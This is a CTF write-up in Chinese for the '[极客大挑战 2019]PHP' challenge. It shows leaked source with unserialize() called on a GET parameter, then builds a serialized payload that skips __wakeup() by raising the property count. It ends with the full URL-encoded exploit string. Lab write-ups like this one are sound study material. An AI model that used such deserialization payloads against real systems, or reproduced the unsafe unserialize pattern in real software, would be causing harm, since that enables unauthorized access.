# \[极客大挑战 2019]PHP

## \[极客大挑战 2019]PHP

## 考点

* 备份文件
* 反序列化
* `__wakeup()`绕过

## wp

提示的找备份文件，发现`www.zip`源码泄露

index.php有个反序列化

```php
<?php
include 'class.php';
$select = $_GET['select'];
$res=unserialize(@$select);
?>
```

class.php给了Name类

```php
<?php
include 'flag.php';
error_reporting(0);
class Name{
    private $username = 'nonono';
    private $password = 'yesyes';
    public function __construct($username,$password){
        $this->username = $username;
        $this->password = $password;
    }
    function __wakeup(){
        $this->username = 'guest';
    }
    function __destruct(){
        if ($this->password != 100) {
            echo "</br>NO!!!hacker!!!</br>";
            echo "You name is: ";
            echo $this->username;echo "</br>";
            echo "You password is: ";
            echo $this->password;echo "</br>";
            die();
        }
        if ($this->username === 'admin') {
            global $flag;
            echo $flag;
        }else{
            echo "</br>hello my friend~~</br>sorry i can't give you the flag!";
            die();         
        }
    }
}
?>
```

根据代码，username是admin，password是100。但是`__wakeup()`会把username重新赋值为guest，修改属性数量绕过。

```php
<?php
class Name{
    private $username = 'admin';
    private $password = 100;
}
$s = serialize(new Name());
echo urlencode($s);
?>
// O%3A4%3A%22Name%22%3A2%3A%7Bs%3A14%3A%22%00Name%00username%22%3Bs%3A5%3A%22admin%22%3Bs%3A14%3A%22%00Name%00password%22%3Bi%3A100%3B%7D
```

把Name后表示属性数量的2改成3即可

```
?select=O%3A4%3A%22Name%22%3A3%3A%7Bs%3A14%3A%22%00Name%00username%22%3Bs%3A5%3A%22admin%22%3Bs%3A14%3A%22%00Name%00password%22%3Bi%3A100%3B%7D
```
